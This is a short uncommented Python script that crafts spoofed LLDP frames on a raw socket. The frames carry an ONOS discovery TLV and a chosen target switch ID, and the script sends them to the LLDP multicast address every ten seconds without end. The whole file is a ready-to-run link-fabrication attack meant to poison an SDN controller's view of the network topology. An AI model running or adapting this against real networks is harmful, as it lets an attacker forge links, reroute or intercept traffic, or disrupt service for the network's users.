#!/usr/bin/python


import sys
import socket
import time

from socket import  AF_PACKET, SOCK_RAW


if len(sys.argv)<3:
    print("Usage : "+sys.argv[0]+" [target switch id] [interface connect network]")

link = sys.argv[1]
interface = sys.argv[2]

mac_address = '\x00\x00\x00\x00\x00\x01'
lldp_multicast = "\x01\x80\xc2\x00\x00\x0e"

s = socket.socket(AF_PACKET, SOCK_RAW)
s.bind((interface, 0))

chid = "\x0a\x0a\xff\x00\x00\x03"
port = "\x03"
swid = link

lldp_pkt = ""
lldp_pkt += "\x02\x07\x04" + chid
lldp_pkt += "\x04\x05\x02\x00\x00\x00" + port
lldp_pkt += "\x06\x02\x00\x78"
lldp_pkt += "\xfe\x12\xa4\x23\x05\x01\x4f\x4e\x4f\x53\x20\x44\x69\x73\x63\x6f\x76\x65\x72\x79"
lldp_pkt += "\xfe\x17\xa4\x23\x05\x02\x6f\x66\x3a\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30" + swid
lldp_pkt += "\x00\x00"


src_addr = mac_address
dst_addr = lldp_multicast
payload = lldp_pkt
ethertype = "\x88\xcc"
packet = dst_addr+src_addr+ethertype+str(lldp_pkt)


while (True):
    s.send(packet)
    time.sleep(10)
